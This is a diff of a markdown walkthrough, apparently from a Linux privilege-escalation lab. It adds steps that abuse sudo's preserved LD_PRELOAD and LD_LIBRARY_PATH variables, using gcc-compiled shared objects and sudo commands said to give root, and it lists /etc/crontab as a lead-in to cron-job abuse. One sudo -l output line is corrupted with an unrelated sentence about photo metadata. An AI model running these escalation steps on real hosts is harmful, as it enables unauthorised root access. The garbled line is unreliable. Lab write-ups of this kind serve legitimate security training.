@@ -91,10 +91,89 @@ User user may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/less
     (root) NOPASSWD: /usr/bin/ftp
     (root) NOPASSWD: /usr/bin/nmap
-    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /usr/sbin/apache2e metadata related to the photo by looking at the post’s metadata.
     (root) NOPASSWD: /bin/more
 ```
 
 You can look up in [GTFOBins](https://gtfobins.github.io/) each directory and their exploit command to access root, except `/apache2`.
 
 ## Sudo - Environmental Variables
+### sudo -l
+From using the `sudo -l` command, the environment variables shared with the users can also be exploited.
+
+```
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+```
+
+We have a tool called `preload.c` we can use to exploit the `env_keep+=LD_PRELOAD`.
+
+Compile the following tool with the command:
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+
+Then run in sudo any program you can run (I used `vim`), while setting the LD_PRELOAD with the full path of new shared object: 
+```
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+Then you'll get root access.
+
+### Program's Shared Library
+
+You can also exploit shared libraries used by a program.
+
+Let's use the `apache2` program for example:
+```
+user@debian:~$ ldd /usr/sbin/apache2
+        linux-vdso.so.1 =>  (0x00007fff629ff000)
+        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f5534a7d000)
+        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f5534859000)
+        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f553461f000)
+        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f5534403000)
+        libc.so.6 => /lib/libc.so.6 (0x00007f5534097000)
+        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f5533e92000)
+        librt.so.1 => /lib/librt.so.1 (0x00007f5533c8a000)
+        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f5533a53000)
+        libdl.so.2 => /lib/libdl.so.2 (0x00007f553384e000)
+        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f5533626000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f5534f3a000)
+```
+
+We have a tool called library_path.c from the `tools` directory, we compile it first in the `/tmp` directory:
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+Then run sudo command with apache2 program while setting up the library shared with `/tmp` directory storing the compiled tool before:
+```
+sudo LD_LIBRARY_PATH=/tmp apache2
+
+```
+Then you'll get root access.
+
+## Cron Jobs - File Permission
+
+First, let's view the following programs or scripts cronjob is scheduled to run.
+
+```
+user@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+
